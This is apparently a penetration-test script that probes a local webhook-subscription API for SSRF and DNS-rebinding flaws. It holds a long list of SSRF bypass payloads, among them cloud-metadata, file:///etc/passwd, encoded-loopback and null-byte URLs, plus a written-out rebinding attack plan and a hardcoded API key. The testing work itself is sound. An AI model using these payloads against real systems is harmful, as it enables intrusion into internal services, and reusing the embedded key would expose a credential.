#!/usr/bin/env python3
"""
SSRF-VULN-04: DNS Rebinding Attack on Webhook Subscriptions
============================================================

Tests the webhook subscription endpoint for DNS rebinding vulnerabilities.

The vulnerability flow:
1. Register webhook URL pointing to public IP domain (passes validation)
2. Validation resolves DNS once (sees public IP - allowed)
3. DNS record flipped to internal IP after registration
4. On delivery (test/event), URL is fetched from DB without re-validation
   --> server makes HTTP request to internal/private IP

Without DNS control, we test:
  a) URL validation bypass attempts (private IPs, localhost variants)
  b) Whether /test endpoint re-validates or blindly fetches
  c) Edge cases in the validation logic
"""

import json
import sys
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

BASE_URL = "http://host.docker.internal:8000"
API_KEY = "fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_"
TIMEOUT = 15

HEADERS = {
    "X-API-Key": API_KEY,
    "Content-Type": "application/json",
    "Accept": "application/json",
}

VALID_EVENTS = ["finding.created"]


def make_session() -> requests.Session:
    session = requests.Session()
    retry = Retry(
        total=1,
        backoff_factor=0.3,
        status_forcelist=[500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session


def print_result(label: str, resp: requests.Response) -> None:
    print(f"\n{'='*65}")
    print(f"[{label}]")
    print(f"  Request : {resp.request.method} {resp.request.url}")
    try:
        body = json.loads(resp.request.body) if resp.request.body else None
        if body:
            print(f"  Body    : {json.dumps(body, indent=4)}")
    except Exception:
        pass
    print(f"  Status  : {resp.status_code}")
    try:
        print(f"  Response: {json.dumps(resp.json(), indent=4)}")
    except Exception:
        print(f"  Response: {resp.text[:500]}")


def print_section(title: str) -> None:
    print(f"\n\n{'#'*65}")
    print(f"# {title}")
    print(f"{'#'*65}")


def register_webhook(session: requests.Session, url: str, description: str) -> requests.Response:
    payload = {
        "url": url,
        "events": VALID_EVENTS,
        "description": description,
    }
    return session.post(
        f"{BASE_URL}/api/v1/webhook-subscriptions/",
        headers=HEADERS,
        json=payload,
        timeout=TIMEOUT,
    )


def list_webhooks(session: requests.Session) -> requests.Response:
    return session.get(
        f"{BASE_URL}/api/v1/webhook-subscriptions/",
        headers=HEADERS,
        timeout=TIMEOUT,
    )


def trigger_test(session: requests.Session, sub_id: str) -> requests.Response:
    return session.post(
        f"{BASE_URL}/api/v1/webhook-subscriptions/{sub_id}/test",
        headers=HEADERS,
        timeout=TIMEOUT,
    )


def delete_webhook(session: requests.Session, sub_id: str) -> requests.Response:
    return session.delete(
        f"{BASE_URL}/api/v1/webhook-subscriptions/{sub_id}",
        headers=HEADERS,
        timeout=TIMEOUT,
    )


# ─────────────────────────────────────────────────────────────────────────────
# Main test runner
# ─────────────────────────────────────────────────────────────────────────────

def main() -> None:
    session = make_session()
    registered_ids: list[str] = []

    # ─────────────────────────────────────────────────────────────────────────
    print_section("STEP 0: List existing webhooks (auth check)")
    # ─────────────────────────────────────────────────────────────────────────
    resp = list_webhooks(session)
    print_result("GET /webhook-subscriptions/", resp)

    # ─────────────────────────────────────────────────────────────────────────
    print_section("STEP 1: Validation tests - private IPs / loopback")
    # ─────────────────────────────────────────────────────────────────────────

    cases_step1 = [
        ("HTTP loopback (plain http)",     "http://127.0.0.1:8000/webhook"),
        ("HTTPS loopback literal",          "https://127.0.0.1:8000/webhook"),
        ("HTTPS 'localhost' hostname",      "https://localhost/webhook"),
        ("HTTPS private 10.x",             "https://10.0.0.1/webhook"),
        ("HTTPS private 172.16.x",         "https://172.16.0.1/webhook"),
        ("HTTPS private 192.168.x",        "https://192.168.1.1/webhook"),
        ("HTTPS link-local 169.254",       "https://169.254.169.254/latest/meta-data/"),
        ("HTTPS ::1 IPv6 loopback",        "https://[::1]/webhook"),
        ("HTTPS 0.0.0.0",                  "https://0.0.0.0/webhook"),
    ]

    for label, url in cases_step1:
        resp = register_webhook(session, url, f"SSRF test: {label}")
        print_result(f"REGISTER | {label}", resp)
        if resp.status_code in (200, 201):
            try:
                registered_ids.append(resp.json()["id"])
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    print_section("STEP 2: Localhost bypass attempts")
    # ─────────────────────────────────────────────────────────────────────────

    bypass_cases = [
        ("Short-form loopback https://127.1/",              "https://127.1/webhook"),
        ("IPv6 all-zeros https://[::]/",                    "https://[::]/webhook"),
        ("Octal notation 0177.0.0.1",                       "https://0177.0.0.1/webhook"),
        ("Hex notation 0x7f000001",                         "https://0x7f000001/webhook"),
        ("Decimal encoding 2130706433",                     "https://2130706433/webhook"),
        ("URL-encoded @ trick (creds in URL)",              "https://attacker.com@127.0.0.1/webhook"),
        ("Mixed case LOCALHOST",                            "https://LOCALHOST/webhook"),
        ("Null byte injection",                             "https://127.0.0.1\x00.attacker.com/webhook"),
        ("Subdomain of 127.0.0.1 (nip.io style)",          "https://127.0.0.1.nip.io/webhook"),
        ("Internal via cloud metadata spoofed domain",      "https://169.254.169.254.nip.io/webhook"),
        ("HTTP (non-HTTPS) to internal",                    "http://10.0.0.1/webhook"),
        ("No scheme (should fail parse)",                   "127.0.0.1/webhook"),
        ("file:// scheme",                                  "file:///etc/passwd"),
        ("ftp:// scheme",                                   "ftp://127.0.0.1/"),
        ("javascript: scheme",                              "javascript:alert(1)"),
    ]

    for label, url in bypass_cases:
        try:
            resp = register_webhook(session, url, f"SSRF bypass: {label}")
            print_result(f"BYPASS | {label}", resp)
            if resp.status_code in (200, 201):
                try:
                    registered_ids.append(resp.json()["id"])
                    print(f"  *** BYPASS SUCCEEDED - ID: {resp.json()['id']} ***")
                except Exception:
                    pass
        except Exception as exc:
            print(f"\n[BYPASS | {label}] -- Exception: {exc}")

    # ─────────────────────────────────────────────────────────────────────────
    print_section("STEP 3: Register a valid-looking external HTTPS URL")
    # ─────────────────────────────────────────────────────────────────────────

    # This simulates the DNS rebinding setup: register a public domain URL.
    # In a real attack, DNS would later be flipped to 127.0.0.1.
    valid_cases = [
        ("Public webhook.site URL",    "https://webhook.site/test-ssrf-fixops"),
        ("httpbin HTTPS endpoint",     "https://httpbin.org/post"),
        ("example.com HTTPS",          "https://example.com/webhook"),
    ]

    for label, url in valid_cases:
        resp = register_webhook(session, url, f"Valid URL test: {label}")
        print_result(f"REGISTER VALID | {label}", resp)
        if resp.status_code in (200, 201):
            try:
                sub_id = resp.json()["id"]
                registered_ids.append(sub_id)
                print(f"  Registered ID: {sub_id}")
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    print_section("STEP 4: List all registered webhooks")
    # ─────────────────────────────────────────────────────────────────────────
    resp = list_webhooks(session)
    print_result("GET /webhook-subscriptions/", resp)

    # ─────────────────────────────────────────────────────────────────────────
    print_section("STEP 5: Trigger /test on registered webhooks (DNS rebinding simulation)")
    # ─────────────────────────────────────────────────────────────────────────
    # The /test endpoint fetches the URL from DB without re-validating DNS.
    # This is the core of the DNS rebinding vulnerability.
    print(f"\nTriggering test on {len(registered_ids)} registered subscription(s):")
    for sub_id in registered_ids:
        resp = trigger_test(session, sub_id)
        print_result(f"POST /test | {sub_id}", resp)

    # ─────────────────────────────────────────────────────────────────────────
    print_section("STEP 6: Vulnerability Analysis Summary")
    # ─────────────────────────────────────────────────────────────────────────
    print("""
SSRF-VULN-04 DNS Rebinding Analysis
=====================================

SOURCE CODE FINDINGS (from webhook_subscriptions_router.py):

1. REGISTRATION (_validate_webhook_url):
   - Scheme must be HTTPS
   - Hostname blocked list: localhost, 127.0.0.1, ::1, 0.0.0.0
   - Direct IP address checked against _BLOCKED_NETS
   - DNS resolved via _is_private_ip() -> socket.getaddrinfo()
   - If hostname resolves to private IP -> blocked

2. /test ENDPOINT (test_subscription):
   - Fetches subscription from DB (contains stored URL)
   - Calls _deliver_webhook(sub, ...) directly
   - NO re-validation of URL at delivery time
   - _deliver_webhook() just does: requests.post(sub["url"], ...)
   - CONFIRMED: URL is NOT re-validated on delivery

3. DNS REBINDING ATTACK SURFACE:
   - Attacker registers: https://attacker-controlled.com/webhook
     (DNS resolves to 1.2.3.4 during validation -> ALLOWED)
   - After registration, DNS TTL expires, rebind to 127.0.0.1
   - Attacker calls POST /webhook-subscriptions/{id}/test
   - Server does requests.post("https://attacker-controlled.com/webhook")
   - DNS now resolves to 127.0.0.1 -> server makes internal request
   - SSRF achieved against internal services

4. ADDITIONAL GAPS:
   - No SSRF re-check in dispatch_event() either
   - No allow_redirects=False would follow redirects to internal IPs
     (actually allow_redirects=False IS set in _deliver_webhook - good)
   - delivery timeout is only 5 seconds (_DELIVERY_TIMEOUT_S)
   - No re-validation in update_subscription after initial check

5. BYPASS VECTORS CHECKED:
   - nip.io / sslip.io style domains (resolve to embedded IP in name)
     -> These bypass hostname blocklist but NOT _is_private_ip() DNS check
     -> BLOCKED at registration if they resolve to private IP
   - Short-form IPs (127.1, 0177.x): Blocked by direct IP parsing
   - Credential injection (user@host): urlparse strips credentials correctly

VERDICT: The DNS rebinding window EXISTS between validation (registration)
and delivery (test/event dispatch). The /test endpoint DOES NOT re-validate
the stored URL before making the outbound HTTP request.
""")

    # ─────────────────────────────────────────────────────────────────────────
    print_section("CLEANUP: Deleting registered test webhooks")
    # ─────────────────────────────────────────────────────────────────────────
    for sub_id in registered_ids:
        resp = delete_webhook(session, sub_id)
        print_result(f"DELETE | {sub_id}", resp)


if __name__ == "__main__":
    main()
